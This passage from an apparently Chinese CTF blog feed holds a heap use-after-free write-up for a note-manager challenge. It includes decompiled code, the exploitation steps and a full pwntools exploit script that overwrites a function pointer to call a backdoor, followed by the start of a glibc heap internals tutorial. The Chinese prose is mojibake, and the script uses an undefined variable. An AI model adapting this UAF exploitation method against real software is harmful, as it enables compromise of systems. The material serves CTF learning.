[esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨UAFæ¼æ´freeæ‰å †å—ï¼Œä½†æ˜¯æ²¡æœ‰æŠŠæŒ‡é’ˆèµ‹å€¼ä¸ºNULL</p><p>Print note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>    (**((<span class="hljs-type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨æ§åˆ¶å †å—çš„æ‰“å°å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºå†…å®¹å †å—çš„åœ°å€</p><p>å­˜åœ¨åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png" alt="åé—¨å‡½æ•°"></p><p>æˆ‘ä»¬ååˆ†æƒ³è°ƒç”¨è¿™ä¸ªè¯±äººä¸”å‹å¥½çš„åé—¨å‡½æ•°ï¼Œä½†æ˜¯æ€ä¹ˆè°ƒç”¨å‘¢ï¼Œè¿™æ˜¯ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“ä½¿ç”¨æ‰“å°å†…å®¹åŠŸèƒ½çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨æ‰“å°å‡½æ•°ï¼Œå¦‚æœè°ƒç”¨æ‰“å°å‡½æ•°çš„åœ°å€æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€é‚£å°±å¥½äº†ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹</p><p>å¦‚æœæƒ³æ”¹å˜æ§åˆ¶å †å—çš„printåœ°å€ï¼Œæˆ‘ä»¬å°±æƒ³åŠæ³•ï¼ŒæŠŠæ§åˆ¶å †å—å˜æˆå†…å®¹å †å—ï¼Œç„¶åè¾“å…¥åé—¨å‡½æ•°åœ°å€è¦†ç›–æ‰printçš„åœ°å€ã€‚</p><p>åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯·note0 å¤§å°ä¸º0x10(åªè¦å¤§å°å’Œæ§åˆ¶å †å—å¤§å°ä¸ä¸€æ ·å°±è¡Œ)</li><li>ç”³è¯·note1 å¤§å°ä¸º0x10(åŒä¸Š)</li><li>é‡Šæ”¾note0</li><li>é‡Šæ”¾note1</li><li>æ­¤æ—¶å¤§å°ä¸º0x10çš„fast binä¸­é“¾è¡¨ä¸ºnote1 -&gt; note0 </li><li>ç”³è¯·note2 å¤§å°ä¸º0x8ï¼Œé‚£ä¹ˆæ ¹æ®å †çš„åˆ†é…è§„åˆ™</li><li>note2çš„æ§åˆ¶å †å—åˆ†é…note1çš„æ§åˆ¶å †å—ï¼Œå†…å®¹å †å—åˆ†é…note0çš„æ§åˆ¶å †å—</li><li>è¿™æ—¶å€™æˆ‘ä»¬å‘note2è¾“å…¥ä¿¡æ¯ï¼Œå°±ä¼šå‚¨å­˜å†note0çš„æ§åˆ¶å †å—</li><li>ç”±äºæˆ‘ä»¬çš„note0æ²¡æœ‰è¢«èµ‹å€¼ä¸ºNULLï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨note0</li><li>å½“å†æ¬¡æ‰ç”¨note0çš„æ‰“å°åŠŸèƒ½çš„æ—¶å€™ï¼Œæ­¤æ—¶å·²ç»è¢«æˆ‘ä»¬è¦†ç›–ä¸ºåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è°ƒç”¨åé—¨å‡½æ•°</li></ul><p>OKäº†å…„å¼Ÿä»¬ï¼Œæ˜¯ä¸æ˜¯éå¸¸ç¥å¥‡ï¼Œä¸€ä¸ªç®€å•çš„é¢˜ï¼Œéƒ½è¦å¾ˆå·§å¦™çš„åˆ©ç”¨</p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn141_1804&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdb.attach(p, gdbscript=<span class="hljs-string">&quot;b * main&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;bbbb&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(use))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€æ¬¡è‰°éš¾çš„å †æ¢ç´¢</title>
    <link href="/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="å †çš„è®¤è¯†"><a href="#å †çš„è®¤è¯†" class="headerlink" title="å †çš„è®¤è¯†"></a>å †çš„è®¤è¯†</h1><h2 id="åˆå§‹å †"><a href="#åˆå§‹å †" class="headerlink" title="åˆå§‹å †"></a>åˆå§‹å †</h2><ul><li>æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´çš„çš„ ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸ</li><li>æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</li><li>åœ¨ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´ï¼Œä½œä¸ºåŠ¨æ€å†…å­˜ç®¡ç†çš„ä¸­é—´äºº</li><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œ å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åº</li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ï¼Œé€‚ æ—¶å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262317234.png"></p><ol><li>å †åŒºåŸŸä¸ºDataä¸Šè¾¹ï¼Œå¢é•¿æ–¹å‘ä¸ºä½åœ°å€åˆ°é«˜åœ°å€ </li><li>shared librariesä¹Ÿæ˜¯å †åŒºåŸŸ</li></ol><h2 id="ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨"><a href="#ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨"></a>ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262321375.png"></p><ol><li>å¯¹äºä¸»çº¿ç¨‹å¯ä»¥ç”¨brkã€mmapç”³è¯·æ ˆç©ºé—´</li><li>å¯¹äºå­çº¿ç¨‹åªèƒ½ç”¨mmapç”³è¯·æ ˆç©ºé—´</li><li>brkç”³è¯·ç©ºé—´æ˜¯æŠŠdataä¸Šé¢çš„heapå‘ä¸Šå¢é•¿ï¼Œmmapç”³è¯·ç©ºé—´æ˜¯åœ¨ç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€</li></ol><h2 id="å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’"><a href="#å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’" class="headerlink" title="å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’"></a>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>å†…å­˜åˆ†é…åŒºï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p><p>æ“ä½œç³»ç»Ÿâ€“&gt;å †ç®¡ç†å™¨â€“&gt;ç”¨æˆ·</p><p>ç‰©ç†å†…å­˜â€“&gt;arenaâ€“&gt;å¯ç”¨å†…å­˜</p><p>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„å†…å­˜äº¤æ˜“å‘ç”Ÿäºarenaä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨å‘æ“ä½œç³»ç»Ÿæ‰¹å‘ä¸‹æ¥çš„æœ‰æœ‰å†—ä½™çš„å†…å­˜åº“å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262338592.png"></p><h2 id="å †çš„åŸºæœ¬å•ä½chunk"><a href="#å †çš„åŸºæœ¬å•ä½chunk" class="headerlink" title="å †çš„åŸºæœ¬å•ä½chunk"></a>å †çš„åŸºæœ¬å•ä½chunk</h2><p>ç”¨æˆ·ç”³è¯·å†…å­˜çš„å•ä½ï¼Œä¹Ÿæ˜¯å †ç®¡ç†å™¨ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½ï¼Œmalloc()è¿”å›æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs [c]">struct malloc_chunk &#123;<br><br>  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */<br>  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */<br><br>  struct malloc_chunk* fd;         /* double links -- used only if free. */<br>  struct malloc_chunk* bk;<br><br>  /* Only used for large blocks: pointer to next larger size.  */<br>  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */<br>  struct malloc_chunk* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="mallco-chunk"><a href="#mallco-chunk" class="headerlink" title="mallco chunk"></a>mallco chunk</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262344788.png"></p><ul><li>prve_size ï¼šè¡¨ç¤ºå‰ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„chunkçš„å¤§å°ï¼Œå½“å‰ä¸€ä¸ªchunkæ²¡æœ‰é‡Šæ”¾æ—¶ï¼Œæ— æ„ä¹‰</li><li>size ï¼šè¡¨ç¤ºè‡ªèº«chunkçš„å¤§å°ï¼Œæœ‰ä¸‰ä¸ªæ ‡å¿—ä½Aã€Mã€P<ul><li>A ï¼šchunk æ˜¯å¦å±äºä¸»çº¿ç¨‹ï¼Œ1è¡¨ç¤ºä¸å±äºï¼Œ0è¡¨ç¤ºå±äº</li><li>M ï¼šchunkæ˜¯å¦ç”¨ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œ1è¡¨ç¤ºæ˜¯ï¼Œ0è¡¨ç¤ºä¸æ˜¯</li><li>P ï¼šchunkå‰ä¸€ä¸ªchunkæ˜¯å¦åœ¨ä½¿ç”¨ï¼Œ1è¡¨ç¤ºåœ¨ä½¿ç”¨ï¼Œ0è¡¨ç¤ºè¢«é‡Šæ”¾</li></ul></li><li></li></ul><h2 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h2><h3 id="fastbin-free-chunk"><a href="#fastbin-free-chunk" class="headerlink" title="fastbin free chunk"></a>fastbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271527975.png"></p><h3 id="smallbin-free-chunk"><a href="#smallbin-free-chunk" class="headerlink" title="smallbin free chunk"></a>smallbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270001044.png"></p><h3 id="lagerbin-free-chunk"><a href="#lagerbin-free-chunk" class="headerlink" title="lagerbin free chunk"></a>lagerbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270010770.png"></p><h2 id="binæœºåˆ¶"><a href="#binæœºåˆ¶" class="headerlink" title="binæœºåˆ¶"></a>binæœºåˆ¶</h2><h3 id="biné“¾çš„ä¿å­˜ï¼ˆstruct-malloc-stateç»“æ„ä½“ï¼‰"><a href="#biné“¾çš„ä¿å­˜ï¼ˆstruct-malloc-stateç»“æ„ä½“ï¼‰" class="headerlink" title="biné“¾çš„ä¿å­˜ï¼ˆstruct_ malloc_stateç»“æ„ä½“ï¼‰"></a>biné“¾çš„ä¿å­˜ï¼ˆstruct_ malloc_stateç»“æ„ä½“ï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs [c]">typedef struct malloc_chunk* mchunkptr;<br>typedef struct malloc_chunk *mfastbinptr;<br>/**<br> * å…¨å±€mallocçŠ¶æ€ç®¡ç†<br> */<br>struct malloc_state<br>&#123;<br>  /* Serialize access. åŒæ­¥è®¿é—®äº’æ–¥é” */<br>  __libc_lock_define (, mutex);<br> <br>  /* Flags (formerly in max_fast).<br>   * ç”¨äºæ ‡è®°å½“å‰ä¸»åˆ†é…åŒºçš„çŠ¶æ€<br>   *  */<br>  int flags;<br> <br>  /* Set if the fastbin chunks contain recently inserted free blocks.  */<br>  /* Note this is a bool but not all targets support atomics on booleans.  */<br>  /* ç”¨äºæ ‡è®°æ˜¯å¦æœ‰fastchunk */<br>  int have_fastchunks;<br> <br>  /* Fastbins fast binsã€‚<br>   * fast binsæ˜¯binsçš„é«˜é€Ÿç¼“å†²åŒºï¼Œå¤§çº¦æœ‰10ä¸ªå®šé•¿é˜Ÿåˆ—ã€‚<br>   * å½“ç”¨æˆ·é‡Šæ”¾ä¸€å—ä¸å¤§äºmax_fastï¼ˆé»˜è®¤å€¼64ï¼‰çš„chunkï¼ˆä¸€èˆ¬å°å†…å­˜ï¼‰çš„æ—¶å€™ï¼Œä¼šé»˜è®¤ä¼šè¢«æ”¾åˆ°fast binsä¸Šã€‚<br>   * */<br>  mfastbinptr fastbinsY[NFASTBINS];<br> <br>  /* Base of the topmost chunk -- not otherwise kept in a bin */<br>  /* Top chunk ï¼šå¹¶ä¸æ˜¯æ‰€æœ‰çš„chunkéƒ½ä¼šè¢«æ”¾åˆ°binsä¸Šã€‚<br>   * top chunkç›¸å½“äºåˆ†é…åŒºçš„é¡¶éƒ¨ç©ºé—²å†…å­˜ï¼Œå½“binsä¸Šéƒ½ä¸èƒ½æ»¡è¶³å†…å­˜åˆ†é…è¦æ±‚çš„æ—¶å€™ï¼Œå°±ä¼šæ¥top chunkä¸Šåˆ†é…ã€‚ */<br>  mchunkptr top;<br> <br>  /* The remainder from the most recent split of a small request */<br>  mchunkptr last_remainder;<br> <br>  /* Normal bins packed as described above<br>   * å¸¸è§„ bins chunkçš„é“¾è¡¨æ•°ç»„<br>   * 1. unsorted binï¼šæ˜¯binsçš„ä¸€ä¸ªç¼“å†²åŒºã€‚å½“ç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¤§äºmax_fastæˆ–è€…fast binsåˆå¹¶åçš„chunkéƒ½ä¼šè¿›å…¥unsorted binä¸Š<br>   * 2. small binså’Œlarge binsã€‚small binså’Œlarge binsæ˜¯çœŸæ­£ç”¨æ¥æ”¾ç½®chunkåŒå‘é“¾è¡¨çš„ã€‚æ¯ä¸ªbinä¹‹é—´ç›¸å·®8ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”é€šè¿‡ä¸Šé¢çš„è¿™ä¸ªåˆ—è¡¨ï¼Œ<br>   * å¯ä»¥å¿«é€Ÿå®šä½åˆ°åˆé€‚å¤§å°çš„ç©ºé—²chunkã€‚<br>   * 3. ä¸‹æ ‡1æ˜¯unsorted binï¼Œ2åˆ°63æ˜¯small binï¼Œ64åˆ°126æ˜¯large binï¼Œå…±126ä¸ªbin<br>   * */<br>  mchunkptr bins[NBINS * 2 - 2];<br> <br>  /* Bitmap of bins<br>   * è¡¨ç¤ºbinæ•°ç»„å½“ä¸­æŸä¸€ä¸ªä¸‹æ ‡çš„binæ˜¯å¦ä¸ºç©ºï¼Œç”¨æ¥åœ¨åˆ†é…çš„æ—¶å€™åŠ é€Ÿ<br>   * */<br>  unsigned int binmap[BINMAPSIZE];<br> <br>  /* åˆ†é…åŒºå…¨å±€é“¾è¡¨ï¼šåˆ†é…åŒºé“¾è¡¨ï¼Œä¸»åˆ†é…åŒºæ”¾å¤´éƒ¨ï¼Œæ–°åŠ å…¥çš„åˆ†é…åŒºæ”¾main_arean.next ä½ç½® Linked list */<br>  struct malloc_state *next;<br> <br>  /* åˆ†é…åŒºç©ºé—²é“¾è¡¨ Linked list for free arenas.  Access to this field is serialized<br>     by free_list_lock in arena.c.  */<br>  struct malloc_state *next_free;<br> <br>  /* Number of threads attached to this arena.  0 if the arena is on<br>     the free list.  Access to this field is serialized by<br>     free_list_lock in arena.c.  */<br>  INTERNAL_SIZE_T attached_threads;<br> <br>  /* Memory allocated from the system in this arena.  */<br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å®é™…ç¼–è¯‘åè¿™ä¸ªç»“æ„ä½“å°±æ˜¯arena</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271319241.png"></p><ul><li><p><strong>fastbinYæ•°ç»„ï¼š</strong>å¤§å°ä¸º10ã€‚è®°å½•çš„æ˜¯fast biné“¾ã€‚<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271321437.png"></p></li><li><p><strong>binsæ•°ç»„ï¼š</strong>å¤§å°ä¸º129ã€‚è®°å½•çš„æ˜¯unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2<del>63ï¼‰ã€large biné“¾ï¼ˆ64</del>126ï¼‰ã€‚<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271332431.png"></p></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast binæ˜¯ptmallocä¸ºäº†è§£å†³ç”¨æˆ·é¢‘ç¹çš„åˆ›å»ºç©ºé—´è¿˜èƒ½å¿«é€Ÿå“åº”çš„ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270032625.png"></p><p>è¡¨å¤´ä¸ºç‰©ç†è¿æ¥ï¼Œæ¯ä¸ªbiné“¾ä¸ºé€»è¾‘è¿æ¥ï¼Œç”¨bkæŒ‡é’ˆ</p><h4 id="fast-binç‰¹ç‚¹"><a href="#fast-binç‰¹ç‚¹" class="headerlink" title="fast binç‰¹ç‚¹"></a>fast binç‰¹ç‚¹</h4><ul><li>é‡‡ç”¨LIFOç­–ç•¥ï¼Œå’Œæ ˆç±»ä¼¼ï¼Œä¸ºå•é“¾è¡¨ç»“æ„</li><li>chunkçš„inuse 